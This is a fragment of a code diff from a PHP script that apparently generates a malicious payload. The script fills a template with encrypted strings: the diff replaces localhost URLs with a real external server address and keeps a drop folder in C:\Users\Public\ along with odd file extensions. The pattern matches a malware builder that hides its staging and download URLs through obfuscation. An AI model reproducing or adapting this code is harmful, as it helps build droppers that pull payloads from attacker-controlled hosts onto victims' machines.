@@ -210,9 +210,9 @@ for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $characte
     $codex=str_replace("%cid%", $wid, $codex); 
     $codex=str_replace("%const1%", cryptw("3"), $codex ); 
 
-    $codex=str_replace("%const2%", cryptw("http://127.0.0.1/fg4gasga"), $codex ); 
-    $codex=str_replace("%const3%", cryptw("http://127.0.0.1/v/fg4gasg"), $codex ); 
-    $codex=str_replace("%const4%", cryptw("http://127.0.0.1/"), $codex );
+    $codex=str_replace("%const2%", cryptw("https://80.32.109.208.host.secureserver.net/fg4gasga"), $codex ); 
+    $codex=str_replace("%const3%", cryptw("https://80.32.109.208.host.secureserver.net/v/fg4gasg"), $codex ); 
+    $codex=str_replace("%const4%", cryptw("https://80.32.109.208.host.secureserver.net/"), $codex );
     $codex=str_replace("%const5%", cryptw("C:\\Users\\Public\\"), $codex ); 
     $codex=str_replace("%const6%", cryptw(".fdgr3"), $codex);
     $codex=str_replace("%const7%", cryptw(".zip"), $codex); 
